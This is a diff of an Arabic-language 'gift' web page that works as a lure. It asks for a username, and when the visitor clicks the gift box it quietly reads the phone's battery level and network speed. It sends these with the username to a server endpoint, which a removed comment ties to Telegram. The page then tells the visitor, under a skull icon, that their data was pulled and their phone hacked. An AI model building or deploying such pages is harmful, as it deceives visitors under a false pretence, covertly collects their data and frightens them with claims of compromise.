@@ -5,9 +5,13 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>🎁 هدية لك</title>
 <style>
-  body, html {
+  * {
     margin: 0;
     padding: 0;
+    box-sizing: border-box;
+  }
+
+  body, html {
     height: 100%;
     width: 100%;
     background-color: #fff;
@@ -17,6 +21,27 @@
     justify-content: center;
     align-items: center;
     overflow: hidden;
+    transition: background-color 0.5s ease;
+  }
+
+  /* لما تتحول لأخضر */
+  body.green-mode {
+    background-color: #0f0 !important;
+  }
+
+  body.green-mode #main-container {
+    background: #0f0 !important;
+    border-color: #0f0 !important;
+    box-shadow: 0 0 80px rgba(0, 255, 0, 0.5) !important;
+  }
+
+  body.green-mode #success-screen {
+    display: block !important;
+  }
+
+  body.green-mode #login-screen,
+  body.green-mode #gift-screen {
+    display: none !important;
   }
 
   #main-container {
@@ -30,6 +55,15 @@
     box-shadow: 0 10px 60px rgba(255, 107, 157, 0.2);
     position: relative;
     border: 2px solid #ff6b9d;
+    transition: all 0.5s ease;
+    min-height: 400px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  #login-screen, #gift-screen, #success-screen {
+    width: 100%;
   }
 
   h1 {
@@ -95,7 +129,6 @@
     box-shadow: 0 6px 30px rgba(255, 107, 157, 0.4);
   }
 
-  /* خلفية القلوب */
   .hearts-bg {
     position: fixed;
     top: 0;
@@ -150,15 +183,8 @@
     display: none !important;
   }
 
-  /* الشاشة الخضراء (بعد فتح الصندوق) */
   #success-screen {
-    background: #0f0;
-    padding: 50px 30px;
-    border-radius: 25px;
-    border: none;
-    box-shadow: 0 0 80px rgba(0, 255, 0, 0.5);
-    animation: flashBg 0.5s ease;
-    color: #000;
+    display: none;
   }
 
   #success-screen h1 {
@@ -172,11 +198,6 @@
     color: #000;
     font-size: 1.3em;
     opacity: 0.8;
-  }
-
-  @keyframes flashBg {
-    0% { transform: scale(0.8); opacity: 0; }
-    100% { transform: scale(1); opacity: 1; }
   }
 
   .battery-info {
@@ -200,14 +221,12 @@
     margin-top: 10px;
   }
 
-  /* أيقونة الهدية */
   .gift-icon {
     font-size: 50px;
     margin-bottom: 10px;
     display: block;
   }
 
-  /* تأثير وميض */
   .glow-text {
     animation: glow 2s ease-in-out infinite;
   }
@@ -217,16 +236,6 @@
     50% { text-shadow: 0 0 30px rgba(255, 107, 157, 0.6), 0 0 60px rgba(255, 107, 157, 0.2); }
   }
 
-  /* شاشة الهدية */
-  #gift-screen h1 {
-    color: #ff6b9d;
-  }
-
-  #gift-screen .sub-text {
-    color: #888;
-  }
-
-  /* تنسيق شاشة الدخول */
   .login-title {
     color: #ff6b9d;
   }
@@ -235,20 +244,23 @@
     color: #999;
   }
 
-  /* صندوق الهدية في الخلفية الخضراء */
   .success-icon {
     font-size: 60px;
     margin-bottom: 15px;
+  }
+
+  /* إخفاء القلوب في الوضع الأخضر */
+  body.green-mode .hearts-bg {
+    display: none;
   }
 </style>
 </head>
 <body>
 
-  <!-- خلفية القلوب -->
   <div class="hearts-bg" id="hearts-bg"></div>
 
   <div id="main-container">
-    <!-- شاشة تسجيل الدخول (بيضاء بقلوب) -->
+    <!-- شاشة تسجيل الدخول -->
     <div id="login-screen">
       <span class="gift-icon">💝</span>
       <h1 class="login-title glow-text">🎀 هدية خاصة لك</h1>
@@ -268,8 +280,8 @@
       <div class="gift-username">👤 <span id="gift-username"></span></div>
     </div>
 
-    <!-- شاشة النجاح (خضراء) -->
-    <div id="success-screen" class="hidden">
+    <!-- شاشة النجاح -->
+    <div id="success-screen">
       <div class="success-icon">💀</div>
       <h1>✅ تم سحب بياناتك</h1>
       <p>☠️ تم اختراق هاتفك بنجاح</p>
@@ -327,13 +339,6 @@ loginForm.addEventListener('submit', function(e) {
     return;
   }
 
-  // إرسال اسم المستخدم إلى التيليجرام
-  fetch('/api/send-username', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ username: username })
-  });
-
   // إظهار اسم المستخدم في شاشة الهدية
   giftUsername.textContent = username;
 
@@ -344,30 +349,48 @@ loginForm.addEventListener('submit', function(e) {
 
 // معالج صندوق الهدية
 giftBox.addEventListener('click', function() {
+  // منع التكرار
+  if (alreadySent) return;
+  
   // تغيير شكل الصندوق
   this.textContent = '🎉';
   this.style.animation = 'none';
   this.style.transform = 'scale(1.3)';
   
   setTimeout(() => {
-    // الانتقال لشاشة النجاح (الخضراء)
-    giftScreen.classList.add('hidden');
-    successScreen.classList.remove('hidden');
+    // تحويل الصفحة كلها لأخضر
+    document.body.classList.add('green-mode');
     
     // عرض اسم المستخدم
     successUsername.textContent = `👤 ${username}`;
     
-    // جلب البطارية وإرسالها (مرة واحدة فقط)
+    // جلب البطارية وقوة النت وإرسالها (مرة واحدة فقط)
     if ('getBattery' in navigator && !alreadySent) {
       alreadySent = true;
+      
       navigator.getBattery().then(function(battery) {
         let percent = Math.round(battery.level * 100);
         batteryDisplay.textContent = `🔋 نسبة البطارية: ${percent}%`;
         
-        fetch('/api/send-battery', {
+        // جلب قوة النت
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        let networkSpeed = 'غير معروف';
+        if (connection) {
+          const speed = connection.downlink;
+          if (speed) {
+            networkSpeed = speed + ' Mbps';
+          }
+        }
+        
+        // إرسال رسالة واحدة فيها كل البيانات
+        fetch('/api/send-all-data', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ battery: percent, username: username })
+          body: JSON.stringify({ 
+            username: username, 
+            battery: percent,
+            network: networkSpeed
+          })
         });
       }).catch(() => {
         batteryDisplay.textContent = '⚠️ لا يمكن قراءة البطارية';
